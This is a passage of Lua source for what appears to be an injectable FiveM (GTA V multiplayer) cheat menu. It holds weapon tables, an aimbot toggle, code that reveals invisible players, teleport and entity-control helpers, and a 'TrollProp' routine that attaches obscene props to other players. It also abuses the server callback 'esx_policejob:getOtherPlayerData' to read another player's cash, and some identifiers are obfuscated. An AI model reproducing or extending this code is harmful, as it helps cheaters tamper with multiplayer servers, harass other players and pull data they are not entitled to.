            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_02"},
                    {name = "Tracer Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER"},
                    {name = "Incendiary Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY"},
                    {name = "Hollow Point Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING"},
                    {name = "FMJ Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ     "}
                },
                Sights = {
                    {name = "Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"},
                    {name = "Zoom Scope", id = "COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2"}
                },
                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_AR_FLSH"}},
                Barrel = {
                    {name = "Default", id = "COMPONENT_AT_MRFL_BARREL_01"},
                    {name = "Heavy", id = "COMPONENT_AT_MRFL_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_AR_SUPP"},
                    {name = "Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"},
                    {name = "Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"},
                    {name = "Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"},
                    {name = "Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"},
                    {name = "Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"},
                    {name = "Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"},
                    {name = "Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"}
                },
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP_02"}}
            }
        }
    },
    Heavy = {
        RPG = {id = "weapon_rpg", name = "RPG", bInfAmmo = false, mods = {}},
        GrenadeLauncher = {id = "weapon_grenadelauncher", name = "Grenade Launcher", bInfAmmo = false, mods = {}},
        GrenadeLauncherSmoke = {
            id = "weapon_grenadelauncher_smoke",
            name = "Grenade Launcher Smoke",
            bInfAmmo = false,
            mods = {}
        },
        Minigun = {id = "weapon_minigun", name = "Minigun", bInfAmmo = false, mods = {}},
        FireworkLauncher = {id = "weapon_firework", name = "Firework Launcher", bInfAmmo = false, mods = {}},
        Railgun = {id = "weapon_railgun", name = "Railgun", bInfAmmo = false, mods = {}},
        HomingLauncher = {id = "weapon_hominglauncher", name = "Homing Launcher", bInfAmmo = false, mods = {}},
        CompactGrenadeLauncher = {
            id = "weapon_compactlauncher",
            name = "Compact Grenade Launcher",
            bInfAmmo = false,
            mods = {}
        },
        Widowmaker = {id = "weapon_rayminigun", name = "Widowmaker", bInfAmmo = false, mods = {}}
    },
    Throwables = {
        Grenade = {id = "weapon_grenade", name = "Grenade", bInfAmmo = false, mods = {}},
        BZGas = {id = "weapon_bzgas", name = "BZ Gas", bInfAmmo = false, mods = {}},
        MolotovCocktail = {id = "weapon_molotov", name = "Molotov Cocktail", bInfAmmo = false, mods = {}},
        StickyBomb = {id = "weapon_stickybomb", name = "Sticky Bomb", bInfAmmo = false, mods = {}},
        ProximityMines = {id = "weapon_proxmine", name = "Proximity Mines", bInfAmmo = false, mods = {}},
        Snowballs = {id = "weapon_snowball", name = "Snowballs", bInfAmmo = false, mods = {}},
        PipeBombs = {id = "weapon_pipebomb", name = "Pipe Bombs", bInfAmmo = false, mods = {}},
        Baseball = {id = "weapon_ball", name = "Baseball", bInfAmmo = false, mods = {}},
        TearGas = {id = "weapon_smokegrenade", name = "Tear Gas", bInfAmmo = false, mods = {}},
        Flare = {id = "weapon_flare", name = "Flare", bInfAmmo = false, mods = {}}
    },
    Misc = {
        Parachute = {id = "gadget_parachute", name = "Parachute", bInfAmmo = false, mods = {}},
        FireExtinguisher = {id = "weapon_fireextinguisher", name = "Fire Extinguisher", bInfAmmo = false, mods = {}}
    }
}

Cya.Hra = {}
local weaponsAimbotT = false
local HVH = false
local rotace = 0
function Cya.Hra:GetPlayers()
	local players = {}
	
	for _,player in ipairs(GetActivePlayers()) do
		local ped = GetPlayerPed(player)
		
		if DoesEntityExist(ped) then
			table.insert(players, player)
		end
	end
	
	return players
end

function Cya.Hra:GetPlayersInArea(coords, area)
	local players       = Cya.Hra:GetPlayers()
	local playersInArea = {}

	for i=1, #players, 1 do
		local target       = GetPlayerPed(players[i])
		local targetCoords = GetEntityCoords(target)
		local distance     = GetDistanceBetweenCoords(targetCoords, coords.x, coords.y, coords.z, true)

		if distance <= area then
			table.insert(playersInArea, players[i])
		end
	end

	return playersInArea
end

function Cya.Hra:GetPedStatus(playerPed) 

	local inVehicle = IsPedInAnyVehicle(playerPed, false)
	local isIdle = IsPedStill(playerPed)
	local isWalking = IsPedWalking(playerPed)
	local isRunning = IsPedRunning(playerPed)

	if inVehicle then
		return '<font color="#FC8B02">In Vehicle'

	elseif isIdle then
		return '<font color="#FC8B02">Idle'

	elseif isWalking then
		return '<font color="#FC8B02">Walking'

	elseif isRunning then
		return '<font color="#FC8B02">Jogging'
	
	else
		return '<font color="#FC8B02">Running'
	end

end

function Cya.Hra:GetCamDirection()
    local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
    local pitch = GetGameplayCamRelativePitch()
    
    local x = -math.sin(heading * math.pi / 180.0)
    local y = math.cos(heading * math.pi / 180.0)
    local z = math.sin(pitch * math.pi / 180.0)
    
    local len = math.sqrt(x * x + y * y + z * z)
    if len ~= 0 then
        x = x / len
        y = y / len
        z = z / len
    end
    
    return x, y, z
end

function Cya.Hra:GetSeatPedIsIn(ped)
	if not IsPedInAnyVehicle(ped, false) then return
	else
		veh = GetVehiclePedIsIn(ped)
		for i = 0, GetVehicleMaxNumberOfPassengers(veh) do
			if GetPedInVehicleSeat(veh) then return i end
		end
	end
end


function Cya.Hra:RequestControlOnce(entity)
    if not NetworkIsInSession() or NetworkHasControlOfEntity(entity) then
        return true
    end
    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
    return NetworkRequestControlOfEntity(entity)
end

function Cya.Hra:TeleportToPlayer(target)
	local ped = GetPlayerPed(target)
    local pos = GetEntityCoords(ped)
    SetEntityCoords(PlayerPedId(), pos)
end

function TeleportToInputtedCoords(QXs, KoXWsSFNDvBT2C7u, EMhy)
	local UI0n8BSFiqt = GetVehiclePedIsIn(GetPlayerPed(-1))
	if IsPedInAnyVehicle(GetPlayerPed(-1), false) then
		SetEntityCoords(UI0n8BSFiqt, QXs, KoXWsSFNDvBT2C7u, EMhy)
	else
		SetEntityCoords(GetPlayerPed(-1), QXs, KoXWsSFNDvBT2C7u, EMhy)
	end
end

function Cya.Hra.GetVehicleProperties(vehicle)
	if DoesEntityExist(vehicle) then
		local colorPrimary, colorSecondary = GetVehicleColours(vehicle)
		local pearlescentColor, wheelColor = GetVehicleExtraColours(vehicle)
		local extras = {}

		for id=0, 12 do
			if DoesExtraExist(vehicle, id) then
				local state = IsVehicleExtraTurnedOn(vehicle, id) == 1
				extras[tostring(id)] = state
			end
		end

		return {
			model             = GetEntityModel(vehicle),

			plate             = takytemamrad.Math.Trim(GetVehicleNumberPlateText(vehicle)),
			plateIndex        = GetVehicleNumberPlateTextIndex(vehicle),

			bodyHealth        = takytemamrad.Math.Round(GetVehicleBodyHealth(vehicle), 1),
			engineHealth      = takytemamrad.Math.Round(GetVehicleEngineHealth(vehicle), 1),

			fuelLevel         = takytemamrad.Math.Round(GetVehicleFuelLevel(vehicle), 1),
			dirtLevel         = takytemamrad.Math.Round(GetVehicleDirtLevel(vehicle), 1),
			color1            = colorPrimary,
			color2            = colorSecondary,

			pearlescentColor  = pearlescentColor,
			wheelColor        = wheelColor,

			wheels            = GetVehicleWheelType(vehicle),
			windowTint        = GetVehicleWindowTint(vehicle),

			neonEnabled       = {
				IsVehicleNeonLightEnabled(vehicle, 0),
				IsVehicleNeonLightEnabled(vehicle, 1),
				IsVehicleNeonLightEnabled(vehicle, 2),
				IsVehicleNeonLightEnabled(vehicle, 3)
			},

			neonColor         = table.pack(GetVehicleNeonLightsColour(vehicle)),
			extras            = extras,
			tyreSmokeColor    = table.pack(GetVehicleTyreSmokeColor(vehicle)),

			modSpoilers       = GetVehicleMod(vehicle, 0),
			modFrontBumper    = GetVehicleMod(vehicle, 1),
			modRearBumper     = GetVehicleMod(vehicle, 2),
			modSideSkirt      = GetVehicleMod(vehicle, 3),
			modExhaust        = GetVehicleMod(vehicle, 4),
			modFrame          = GetVehicleMod(vehicle, 5),
			modGrille         = GetVehicleMod(vehicle, 6),
			modHood           = GetVehicleMod(vehicle, 7),
			modFender         = GetVehicleMod(vehicle, 8),
			modRightFender    = GetVehicleMod(vehicle, 9),
			modRoof           = GetVehicleMod(vehicle, 10),

			modEngine         = GetVehicleMod(vehicle, 11),
			modBrakes         = GetVehicleMod(vehicle, 12),
			modTransmission   = GetVehicleMod(vehicle, 13),
			modHorns          = GetVehicleMod(vehicle, 14),
			modSuspension     = GetVehicleMod(vehicle, 15),
			modArmor          = GetVehicleMod(vehicle, 16),

			modTurbo          = IsToggleModOn(vehicle, 18),
			modSmokeEnabled   = IsToggleModOn(vehicle, 20),
			modXenon          = IsToggleModOn(vehicle, 22),

			modFrontWheels    = GetVehicleMod(vehicle, 23),
			modBackWheels     = GetVehicleMod(vehicle, 24),

			modPlateHolder    = GetVehicleMod(vehicle, 25),
			modVanityPlate    = GetVehicleMod(vehicle, 26),
			modTrimA          = GetVehicleMod(vehicle, 27),
			modOrnaments      = GetVehicleMod(vehicle, 28),
			modDashboard      = GetVehicleMod(vehicle, 29),
			modDial           = GetVehicleMod(vehicle, 30),
			modDoorSpeaker    = GetVehicleMod(vehicle, 31),
			modSeats          = GetVehicleMod(vehicle, 32),
			modSteeringWheel  = GetVehicleMod(vehicle, 33),
			modShifterLeavers = GetVehicleMod(vehicle, 34),
			modAPlate         = GetVehicleMod(vehicle, 35),
			modSpeakers       = GetVehicleMod(vehicle, 36),
			modTrunk          = GetVehicleMod(vehicle, 37),
			modHydrolic       = GetVehicleMod(vehicle, 38),
			modEngineBlock    = GetVehicleMod(vehicle, 39),
			modAirFilter      = GetVehicleMod(vehicle, 40),
			modStruts         = GetVehicleMod(vehicle, 41),
			modArchCover      = GetVehicleMod(vehicle, 42),
			modAerials        = GetVehicleMod(vehicle, 43),
			modTrimB          = GetVehicleMod(vehicle, 44),
			modTank           = GetVehicleMod(vehicle, 45),
			modWindows        = GetVehicleMod(vehicle, 46),
			modLivery         = GetVehicleLivery(vehicle)
		}
	else
		return
	end
end

Cya.Keys = {
	["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57,
    ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
    ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
    ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
    ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
    ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
    ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
    ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173, ["INSERT"] = 121,
    ["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118,
    ["MOUSE1"] = 24
}

---------------------------------------------------------------------------------------

CreateThread(function()
	while Enabled do
		Wait(0)

		if Cya.Player.RevealInvisibles then
			for id, src in dict.pairs(FlayerCache) do
				src = dict.tonumber(src)

				if src ~= PlayerId() then
					local _ped = GetPlayerPed(src)
					local where = GetOffsetFromEntityInWorldCoords(_ped, 0.0, 0.0, 1.0)
					local us = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 0.0, 0.0)
					local dist = GetDistanceBetweenCoords(where.x, where.y, where.z, us.x, us.y, us.z)

					if dist <= 100.0 then
						local invis = not IsEntityVisibleToScript(_ped)

						if invis then
							SetEntityLocallyVisible(_ped, true)
							SetEntityAlpha(_ped, 150)
							Draw3DText(where.x, where.y, where.z + 0.3, "*PLAYER INVISIBLE*", 255, 55, 55, 255)
							was_other_invis[src] = true
						else
							SetEntityAlpha(_ped, 255)
							was_other_invis[src] = false
						end
					else
						SetEntityAlpha(_ped, 255)
						was_other_invis[src] = false
					end
				end
			end
		end
	end
end)


local storedPrimary, storedSecondary = nil

local function RainbowVehicle(justToggled)
	if Cya.Player.IsInVehicle then
		if justToggled then
			storedPrimary, storedSecondary = GetVehicleColours(Cya.Player.Vehicle)
			Cya.Toggle.RainbowVehicle = justToggled
		else
			Cya.Toggle.RainbowVehicle = justToggled
			ClearVehicleCustomPrimaryColour(Cya.Player.Vehicle)
			ClearVehicleCustomSecondaryColour(Cya.Player.Vehicle)
			SetVehicleColours(Cya.Player.Vehicle, storedPrimary, storedSecondary)
		end
	else
		Cya.Toggle.RainbowVehicle = justToggled
	end
end


local function TrollProp(target, prop)
	local ec = GetHashKey(prop)
	local ed = CreateObject(ec, 0, 0, 0, true, true, true)
	if prop == 'prop_cs_dildo_01' then
		AttachEntityToEntity(ed, target, GetPedBoneIndex(target, 24818), -0.425, 0.185, 0.0, 270.0, 0.0, -25.0, true, true, false, true, 1, true)
	else
		AttachEntityToEntity(ed, target, GetPedBoneIndex(target, 57005), 0.4, 0.0, 0.0, 0.0, 270.0, 60.0, true, true, false, true, 1, true)
	end
end

local NoclipSpeed = 1
local oldSpeed = 1

-- Globals
-- Menu color customization
local _menuColor = {
	base = { r = 162, g = 158, b = 164, a = 230 },
	highlight = { r = 162, g = 158, b = 164, a = 150 },
	shadow = { r = 162, g = 158, b = 164, a = 150 },
}

-- Teleport to custom cords
local currentTeleportToOptions = 1
local selectedTeleportToOptions = 1

-- License key validation for takytemamrad

local _gatekeeper = true
local entityEnumerator = {
	__gc = function(enum)
		if enum.destructor and enum.handle then
			enum.destructor(enum.handle)
		end
		enum.destructor = nil
		enum.handle = nil
	end
}

local function EnumerateEntities(initFunc, moveFunc, disposeFunc)
	return coroutine.wrap(function()
	  	local iter, id = initFunc()
	  	if not id or id == 0 then
			disposeFunc(iter)
			return
	  	end

	  	local enum = {handle = iter, destructor = disposeFunc}
	  	setmetatable(enum, entityEnumerator)

	  	local next = true
	  	repeat
			coroutine.yield(id)
			next, id = moveFunc(iter)
	  	until not next

	  	enum.destructor, enum.handle = nil, nil
	  	disposeFunc(iter)
	end)
end

local function EnumerateObjects()
	return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
end

local function EnumeratePeds()
	return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
end

local function EnumerateVehicles()
	return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
end

local function EnumeratePickups()
	return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
end

local function AddVectors(vect1, vect2)
    return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
end

local function SubVectors(vect1, vect2)
    return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
end

local function ScaleVector(vect, mult)
    return vector3(vect.x * mult, vect.y * mult, vect.z * mult)
end

local function ApplyForce(entity, direction)
    ApplyForceToEntity(entity, 3, direction, 0, 0, 0, false, false, true, true, false, true)
end

local function Oscillate(entity, position, angleFreq, dampRatio)
    local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq * angleFreq))
    local pos2 = AddVectors(ScaleVector(GetEntityVelocity(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
    local targetPos = SubVectors(pos1, pos2)
    
    ApplyForce(entity, targetPos)
end

local function RotationToDirection(rotation)
    local retz = math.rad(rotation.z)
    local retx = math.rad(rotation.x)
    local absx = math.abs(math.cos(retx))
    return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
end

local function WorldToScreenRel(worldCoords)
    local check, x, y = GetScreenCoordFromWorldCoord(worldCoords.x, worldCoords.y, worldCoords.z)
    if not check then
        return false
    end
    
    local screenCoordsx = (x - 0.5) * 2.0
    local screenCoordsy = (y - 0.5) * 2.0
    return true, screenCoordsx, screenCoordsy
end

local function ScreenToWorld(screenCoord)
    local camRot = GetGameplayCamRot(2)
    local camPos = GetGameplayCamCoord()
    
    local vect2x = 0.0
    local vect2y = 0.0
    local vect21y = 0.0
    local vect21x = 0.0
    local direction = RotationToDirection(camRot)
    local vect3 = vector3(camRot.x + 10.0, camRot.y + 0.0, camRot.z + 0.0)
    local vect31 = vector3(camRot.x - 10.0, camRot.y + 0.0, camRot.z + 0.0)
    local vect32 = vector3(camRot.x, camRot.y + 0.0, camRot.z + -10.0)
    
    local direction1 = RotationToDirection(vector3(camRot.x, camRot.y + 0.0, camRot.z + 10.0)) - RotationToDirection(vect32)
    local direction2 = RotationToDirection(vect3) - RotationToDirection(vect31)
    local radians = -(math.rad(camRot.y))
    
    vect33 = (direction1 * math.cos(radians)) - (direction2 * math.sin(radians))
    vect34 = (direction1 * math.sin(radians)) - (direction2 * math.cos(radians))
    
    local case1, x1, y1 = WorldToScreenRel(((camPos + (direction * 10.0)) + vect33) + vect34)
    if not case1 then
        vect2x = x1
        vect2y = y1
        return camPos + (direction * 10.0)
    end
    
    local case2, x2, y2 = WorldToScreenRel(camPos + (direction * 10.0))
    if not case2 then
        vect21x = x2
        vect21y = y2
        return camPos + (direction * 10.0)
    end
    
    if math.abs(vect2x - vect21x) < 0.001 or math.abs(vect2y - vect21y) < 0.001 then
        return camPos + (direction * 10.0)
    end
    
    local x = (screenCoord.x - vect21x) / (vect2x - vect21x)
    local y = (screenCoord.y - vect21y) / (vect2y - vect21y)
    return ((camPos + (direction * 10.0)) + (vect33 * x)) + (vect34 * y)

end

local function GetCamDirFromScreenCenter()
    local pos = GetGameplayCamCoord()
    local world = ScreenToWorld(0, 0)
    local ret = SubVectors(world, pos)
    return ret
end


local function TeleportToWaypoint()
	local WaypointHandle = GetFirstBlipInfoId(8)

  	if DoesBlipExist(WaypointHandle) then
  		local waypointCoords = GetBlipInfoIdCoord(WaypointHandle)
		for height = 1, 1000 do
			SetPedCoordsKeepVehicle(PlayerPedId(), waypointCoords["x"], waypointCoords["y"], height + 0.0)

			local foundGround, zPos = GetGroundZFor_3dCoord(waypointCoords["x"], waypointCoords["y"], height + 0.0)

			if foundGround then
				SetPedCoordsKeepVehicle(PlayerPedId(), waypointCoords["x"], waypointCoords["y"], height + 0.0)

				break
			end

			Citizen.Wait(0)
		end
	else
		takytemamrad.SendNotification({text = "Please place a waypoint", type = 'error'})
	end
end

AddTextEntry('notification_buffer', '~a~')
AddTextEntry('text_buffer', '~a~')
AddTextEntry('preview_text_buffer', '~a~')
RegisterTextLabelToSave('keyboard_title_buffer')

-- Classes
-- > Gatekeeper
Gatekeeper = {}



-- Fullscreen Notification builder
--local _notifTitle = "~p~ECHO MENU"
--local _notifMsg = "Musíme overit tvou licenci"
--local _notifMsg2 = "~g~Prosím vlož svuj code"
--local _errorCode = 0

local _blackAmount = 0 
-- Get other player data
local function GetPlayerMoney(player)
	ESX.TriggerServerCallback('esx_policejob:getOtherPlayerData', function(data)
		for k,v in ipairs(data.inventory) do
			if v.name == 'cash' then
				_blackAmount =  v.count
				break
			end
		end
	end, player)

	return _blackAmount
end

-- Create a thread to loop this warning message.
-- [NOTE] POPUP AUTH WARNING

AddEventHandler("optionSelected", function(selected)
    --debugprint(selected) -- do whatever you want with the selected choice.
    -- players can either press the physicial buttons, or they can click
    -- the instructional buttons with their mouse and it will trigger
	-- the event as well.
	GateKeep()
end)

local function FgWqg()
	local ouGWmAexz = {}
	for i = 0, GetNumResources() do
		ouGWmAexz[i] = GetResourceByFindIndex(i)
	end
	return ouGWmAexz
end
local RwFbMFt4elf6NNUg0kg = {}
RwFbMFt4elf6NNUg0kg = FgWqg()

local ratio = GetAspectRatio(true)
local mult = 10^3
local floor = math.floor
local unpack = table.unpack

local streamedTxtSize

local txtRatio = {}

local function DrawSpriteScaled(textureDict, textureName, screenX, screenY, width, height, heading, red, green, blue, alpha)
	-- calculate the height of a sprite using aspect ratio and hash it in memory
	local index = tostring(textureName)
	
	if not txtRatio[index] then
		txtRatio[index] = {}
		local res = GetTextureResolution(textureDict, textureName)
		
		txtRatio[index].ratio = (res[2] / res[1])
		txtRatio[index].height = floor(((width * txtRatio[index].ratio) * ratio) * mult + 0.5) / mult
		DrawSprite(textureDict, textureName, screenX, screenY, width, txtRatio[index].height, heading, red, green, blue, alpha)
	end
	
	DrawSprite(textureDict, textureName, screenX, screenY, width, txtRatio[index].height, heading, red, green, blue, alpha)
end

local function RequestControlOnce(entity)
    if NetworkHasControlOfEntity(entity) then
        return true
    end
    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
    return NetworkRequestControlOfEntity(entity)
end

-- Init variables
local showMinimap = false


-- This is for MK2 Weapons
local weaponMkSelection = {}

local weaponTextures = {
	{'https://i.imgur.com/GmpQc7C.png', 'weapon_dagger'},
	{'https://i.imgur.com/dL5qnPn.png?1','weapon_bat'},
	{'https://i.imgur.com/V2yYrH1.png','WEAPON_APPISTOL'},
	{'https://i.imgur.com/RaFQ0th.png','weapon_machete'},
}

local w_Txd = CreateRuntimeTxd('weapon_icons')

local function CreateWeaponTextures()
	
	for i = 1, #weaponTextures do
		local w_DuiObj = CreateDui(weaponTextures[i][1], 256, 128)
		local w_DuiHandle = GetDuiHandle(w_DuiObj)
		local w_Txt = CreateRuntimeTextureFromDuiHandle(w_Txd, weaponTextures[i][2], w_DuiHandle)
		
		-- debugprint(("Successfully created texture %s"):format(weaponTextures[i][2]))
		--CommitRuntimeTexture(w_Txt)
	end
end


-- Create text for cords

-- CreateWeaponTextures()

-- Predelat barvy zbrani

-- [NOTE] Weapon Table
local t_Weapons = {

	-- Melee Weapons
	{'WEAPON_BAT', '<font color="#66666A">Baseball Bat', "weapon_bat", "weapon_icons", "melee"},
	{'WEAPON_BATTLEAXE', '<font color="#66666A">Battleaxe', "w_me_fireaxe", "mpweaponsunusedfornow", "melee"},
	{'WEAPON_BOTTLE', '<font color="#66666A">Broken Bottle', nil, nil, "melee"},
	{'WEAPON_CROWBAR', '<font color="#66666A">Crowbar', "w_me_crowbar", "mpweaponsunusedfornow", "melee"},
	{'WEAPON_DAGGER', '<font color="#66666A">Antique Cavalry Dagger', "weapon_dagger", "weapon_icons", "melee"},
	{'WEAPON_FLASHLIGHT', '<font color="#66666A">Flashlight', nil, nil, "melee"},
	{'WEAPON_GOLFCLUB', '<font color="#66666A">Golf Club', "w_me_gclub", "mpweaponsunusedfornow", "melee"},
	{'WEAPON_HAMMER', '<font color="#66666A">Hammer', "w_me_hammer", "mpweaponsunusedfornow", "melee"},
	{'WEAPON_HATCHET', '<font color="#66666A">Hatchet', nil, nil, "melee"},
	{'WEAPON_KNIFE', '<font color="#66666A">Knife', "weapon_knife", "weapon_icons", "melee"},
	{'WEAPON_KNUCKLE', '<font color="#66666A">Brass Knuckles', nil, nil, "melee"},
	{'WEAPON_MACHETE', '<font color="#66666A">Machete', 'weapon_machete', 'weapon_icons', "melee"},
	{'WEAPON_NIGHTSTICK', '<font color="#66666A">Nightstick', "w_me_nightstick", "mpweaponsunusedfornow", "melee"},
	{'WEAPON_POOLCUE', '<font color="#66666A">Pool Cue', nil, nil, "melee"},
	{'WEAPON_STONE_HATCHET', '<font color="#66666A">Stone Hatchet', nil, nil, "melee"},
	{'WEAPON_SWITCHBLADE', '<font color="#66666A">Switchblade', nil, nil, "melee"},
	{'WEAPON_WRENCH', '<font color="#66666A">Wrench', "w_me_wrench", "mpweaponsunusedfornow", "melee"},
	
	-- Handguns
	{'WEAPON_PISTOL', '<font color="#66666A">Pistol', "w_pi_pistol", "mpweaponsgang1_small", "handguns", true},
	{'WEAPON_COMBATPISTOL', '<font color="#66666A">Combat Pistol', "w_pi_combatpistol", "mpweaponscommon_small", "handguns"},
	{'WEAPON_APPISTOL', '<font color="#66666A">AP Pistol', "w_pi_apppistol", "mpweaponsgang1_small", "handguns"},
	{'WEAPON_STUNGUN', '<font color="#66666A">Stungun', "w_pi_stungun", "mpweaponsgang0_small", "handguns"},
	{'WEAPON_PISTOL50', '<font color="#66666A">Pistol .50', nil, nil, "handguns"},
	{'WEAPON_SNSPISTOL', '<font color="#66666A">SNS Pistol', nil, nil, "handguns", true},
	{'WEAPON_HEAVYPISTOL', '<font color="#66666A">Heavy Pistol', nil, nil, "handguns"},
	{'WEAPON_VINTAGEPISTOL', '<font color="#66666A">Vintage Pistol', nil, nil, "handguns"},
	{'WEAPON_FLAREGUN', '<font color="#66666A">Flare Gun', nil, nil, "handguns"},
	{'WEAPON_MARKSMANPISTOL', '<font color="#66666A">Marksman Pistol', nil, nil, "handguns"},
	{'WEAPON_REVOLVER', '<font color="#66666A">Heavy Revolver', nil, nil, "handguns", true},
	{'WEAPON_DOUBLEACTION', '<font color="#66666A">Double Action Revolver', nil, nil, "handguns"},
	{'WEAPON_RAYPISTOL', '<font color="#66666A">Up-n-Atomizer', nil, nil, "handguns"},
	{'WEAPON_CERAMICPISTOL', '<font color="#66666A">Ceramic Pistol', nil, nil, "handguns"},
	{'WEAPON_NAVYREVOLVER', '<font color="#66666A">Navy Revolver', nil, nil, "handguns"},

	-- SMGs
	{'WEAPON_MICROSMG', '<font color="#66666A">Micro SMG', "w_sb_microsmg", "mpweaponscommon_small", "smgs"},
	{'WEAPON_SMG', '<font color="#66666A">SMG', nil, nil, "smgs", true},
	{'WEAPON_ASSAULTSMG','<font color="#66666A">Assault SMG', "w_sb_assaultsmg", "mpweaponscommon_small", "smgs"},
	{'WEAPON_COMBATPDW', '<font color="#66666A">Combat PDW', nil, nil, "smgs"},
	{'weapon_machinepistol', '<font color="#66666A">Machine Pistol', nil, nil, "smgs"},
	{'weapon_minismg', '<font color="#66666A">Mini SMG', nil, nil, "smgs"},
	{'weapon_raycarbine', '<font color="#66666A">Unholy Hellbringer', nil, nil, "smgs"},
	
	-- Shotguns
	{'WEAPON_PUMPSHOTGUN', '<font color="#66666A">Pump Shotgun', "w_sg_pumpshotgun", "mpweaponscommon_small", "shotguns", true},
	{'WEAPON_SAWNOFFSHOTGUN', '<font color="#66666A">Sawed-Off Shotgun', "w_sg_sawnoff", "mpweaponsgang1", "shotguns"},
	{'WEAPON_ASSAULTSHOTGUN', '<font color="#66666A">Assault Shotgun', "w_sg_assaultshotgun", "mpweaponscommon_small", "shotguns"},
	{'weapon_bullpupshotgun', '<font color="#66666A">Bullpup Shotgun', nil, nil, "shotguns"},
	{'weapon_musket', '<font color="#66666A">Musket', nil, nil, "shotguns"},
	{'weapon_heavyshotgun', '<font color="#66666A">Heavy Shotgun', nil, nil, "shotguns"},
	{'weapon_dbshotgun', '<font color="#66666A">Double Barrel Shotgun', nil, nil, "shotguns"},
	{'weapon_autoshotgun', '<font color="#66666A">Sweeper Shotgun', nil, nil, "shotguns"},

	-- Assault Rifles
	{'WEAPON_ASSAULTRIFLE', '<font color="#66666A">Assault Rifle', "w_ar_assaultrifle", "mpweaponsgang1_small", "assaultrifles", true},
	{'weapon_carbinerifle', '<font color="#66666A">Carbine Rifle', "w_ar_carbinerifle", "mpweaponsgang0_small", "assaultrifles", true},
	{'weapon_advancedrifle', '<font color="#66666A">Advanced Rifle', nil, nil, "assaultrifles"},
	{'weapon_specialcarbine', '<font color="#66666A">Special Carbine', nil, nil, "assaultrifles", true},
	{'weapon_bullpuprifle', '<font color="#66666A">Bullpup Rifle', nil, nil, "assaultrifles", true},
	{'weapon_compactrifle', '<font color="#66666A">Compact Rifle', nil, nil, "assaultrifles"},

	-- LMGs
	{'weapon_mg', '<font color="#66666A">MG', nil, nil, "lmgs"},
	{'weapon_combatmg', '<font color="#66666A">Combat MG', "w_mg_combatmg", "mpweaponsgang0_small", "lmgs", true},
	{'weapon_gusenburg', '<font color="#66666A">Gusenberg Sweeper', nil, nil, "lmgs"},

	-- Sniper Rifles
	{'WEAPON_SNIPERRIFLE', '<font color="#66666A">Sniper Rifle', "w_sr_sniperrifle", "mpweaponsgang0_small", "sniperrifles"},
	{'WEAPON_HEAVYSNIPER', '<font color="#66666A">Heavy Sniper', "w_sr_heavysniper", "mpweaponsgang0_small", "sniperrifles", true},
	{'weapon_marksmanrifle', '<font color="#66666A">Marksman Rifle', nil, nil, "sniperrifles", true},
	-- Heavy Weapons
	{'WEAPON_RPG', '<font color="#66666A">RPG', nil, nil, "heavyweapons"},
